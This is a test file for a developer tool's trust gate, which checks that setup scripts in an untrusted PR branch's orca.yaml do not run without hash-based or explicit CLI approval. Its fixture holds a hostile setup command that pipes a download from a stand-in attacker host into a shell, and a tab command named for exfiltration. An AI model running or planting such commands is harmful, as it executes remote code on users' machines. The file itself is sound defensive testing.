import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import type { Repo } from '../../shared/repo-types'
import { getOrcaSetupTrustContent, hashOrcaHookScriptContent } from '../../shared/orca-hook-trust'
import type { PersistedTrustedOrcaHooks } from '../../shared/orca-yaml-hook-types'
import { prepareRuntimeLocalWorktreeSetup } from './runtime-local-worktree-setup'
import type { RuntimeManagedWorktreeCreateArgs } from './runtime-managed-worktree-create-types'

const { createSetupRunnerScriptMock, runHookMock } = vi.hoisted(() => ({
  createSetupRunnerScriptMock: vi.fn(),
  runHookMock: vi.fn()
}))

vi.mock('../worktree-runner-script', async (importOriginal) => ({
  ...(await importOriginal<Record<string, unknown>>()),
  createSetupRunnerScript: createSetupRunnerScriptMock,
  resolveSetupRunnerShell: () => undefined
}))
vi.mock('../hooks', async (importOriginal) => ({
  ...(await importOriginal<Record<string, unknown>>()),
  runHook: runHookMock
}))

// A PR branch's orca.yaml: the primary checkout never had these commands.
const WORKTREE_ORCA_YAML = [
  'scripts:',
  '  setup: curl https://attacker.example/x | sh',
  'defaultTabs:',
  '  - title: Server',
  '    command: node exfiltrate.js'
].join('\n')

const repo = {
  id: 'repo-1',
  path: '/primary/repo',
  displayName: 'repo',
  badgeColor: '#000',
  addedAt: 0
} as Repo

let worktreePath: string
let trustContent: string

function prepare(
  request: Partial<RuntimeManagedWorktreeCreateArgs>,
  trustedOrcaHooks: PersistedTrustedOrcaHooks = {},
  shouldUseSetupRunner = true
) {
  return prepareRuntimeLocalWorktreeSetup({
    request: { repoSelector: 'repo-1', name: 'pr-42', ...request },
    repo,
    worktreePath,
    // SAFETY: settings are only forwarded to the mocked resolveSetupRunnerShell.
    settings: {} as never,
    runtimeTarget: undefined,
    shouldUseSetupRunner,
    trustStore: { getUI: () => ({ trustedOrcaHooks }) }
  })
}

describe('prepareRuntimeLocalWorktreeSetup orca.yaml trust', () => {
  beforeEach(() => {
    worktreePath = mkdtempSync(join(tmpdir(), 'orca-setup-trust-'))
    writeFileSync(join(worktreePath, 'orca.yaml'), WORKTREE_ORCA_YAML)
    trustContent = getOrcaSetupTrustContent({
      scripts: { setup: 'curl https://attacker.example/x | sh' },
      defaultTabs: [{ title: 'Server', command: 'node exfiltrate.js' }]
    })
    createSetupRunnerScriptMock.mockReset()
    createSetupRunnerScriptMock.mockReturnValue({ runnerScriptPath: '/runner.sh', envVars: {} })
    runHookMock.mockReset()
    runHookMock.mockResolvedValue({ success: true, output: '' })
  })

  afterEach(() => {
    rmSync(worktreePath, { recursive: true, force: true })
  })

  it('does not run untrusted worktree setup on an inherited CLI decision', async () => {
    const result = await prepare({ cliProvenance: { kind: 'created-by-cli', createdAt: 1 } })

    expect(result.setup).toBeUndefined()
    expect(result.shouldRunSetup).toBe(false)
    expect(result.defaultTabs?.runCommands).toBe(false)
    expect(result.setupApproval).toMatchObject({
      scriptContent: trustContent,
      contentHash: hashOrcaHookScriptContent(trustContent),
      setup: { runnerScriptPath: '/runner.sh' },
      runDefaultTabCommands: true
    })
  })

  it('does not start an untrusted in-process setup hook', async () => {
    const result = await prepare({}, {}, false)

    expect(runHookMock).not.toHaveBeenCalled()
    expect(result.didStartInProcessSetupHook).toBe(false)
    expect(result.setupApproval).toBeDefined()
  })

  it('runs setup whose exact content hash is trusted', async () => {
    const result = await prepare(
      {},
      {
        'repo-1': { setup: { contentHash: hashOrcaHookScriptContent(trustContent), approvedAt: 1 } }
      }
    )

    expect(result.setup).toEqual({ runnerScriptPath: '/runner.sh', envVars: {} })
    expect(result.defaultTabs?.runCommands).toBe(true)
    expect(result.setupApproval).toBeUndefined()
  })

  it('runs setup for an explicit CLI --setup run', async () => {
    const result = await prepare({
      setupDecision: 'run',
      cliProvenance: { kind: 'created-by-cli', createdAt: 1 }
    })

    expect(result.setup).toBeDefined()
    expect(result.setupApproval).toBeUndefined()
  })

  it('runs setup for CLI --run-hooks', async () => {
    const result = await prepare({
      runHooks: true,
      cliProvenance: { kind: 'created-by-cli', createdAt: 1 }
    })

    expect(result.setup).toBeDefined()
  })

  it('does not treat a non-CLI run decision as approval of unseen content', async () => {
    const result = await prepare({ setupDecision: 'run' })

    expect(result.setup).toBeUndefined()
    expect(result.setupApproval).toBeDefined()
  })
})
